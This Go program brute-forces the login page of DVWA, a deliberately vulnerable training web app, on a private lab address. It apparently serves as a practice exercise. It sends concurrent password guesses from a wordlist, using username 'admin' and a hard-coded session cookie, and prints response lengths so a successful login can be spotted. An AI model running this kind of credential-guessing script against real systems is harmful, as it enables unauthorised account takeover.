package main

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
)

func main() {
	ch := make(chan string, 150)
	var wg sync.WaitGroup
	lock := &sync.Mutex{}
	wg.Add(55898)
	//filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"
	filePath := "C:\\Users\\Zank\\go\\src\\brute\\MD5pass.txt"

	f, err := os.Open(filePath)
	if err != nil {
		fmt.Println("err:", err)
	}
	lines := bufio.NewReader(f)
	for {
		line, err := lines.ReadString('\n')
		line = strings.Replace(line, "\n", "", -1)
		if err != nil || io.EOF == err { // err ==io.EOF 的时候其实还有一行数据，看到io.EOF就跳出而不读取就跳出的话会丢失
			if line == "" {
				break
			}
		}
		url_ := "http://192.168.124.26/dvwa/vulnerabilities/brute/?" // ?username=admin&password=" + line + "&Login=Login#"
		//url_ = url.QueryEscape(url_)
		var urlN = url.Values{}
		urlN.Add("Login", "Login")
		urlN.Add("password", line)
		urlN.Add("username", "admin")
		url_ = url_ + urlN.Encode() + "#"

		go func(url_ string, wg *sync.WaitGroup, ch chan string, lock *sync.Mutex) {
			lock.Lock()
			ch <- url_
			lock.Unlock()
			resp, err := http.NewRequest("GET", url_, nil)
			if err != nil {
				fmt.Println(err)
			}
			resp.Header.Add("Cookie", "security=low; security=low; PHPSESSID=q31peq2jk4r1osp45r18hhhjk6")
			client := http.Client{}

			for i := 0; i < 10; i++ {
				res, err := client.Do(resp)
				if err != nil {
					fmt.Println("err:", err)
				}

				if res.StatusCode == 200 {
					//fmt.Println(*res)
					body_, err := ioutil.ReadAll(res.Body) // 读取body内容，二进制流方式
					if err != nil {
						fmt.Println("err:", err)
					}
					fmt.Println(url_)
					fmt.Println(len(string(body_)))
					res.Body.Close()
					<-ch
					break

				}

			}

			wg.Done()

		}(url_, &wg, ch, lock)

	}
	wg.Wait()

	defer f.Close()

}
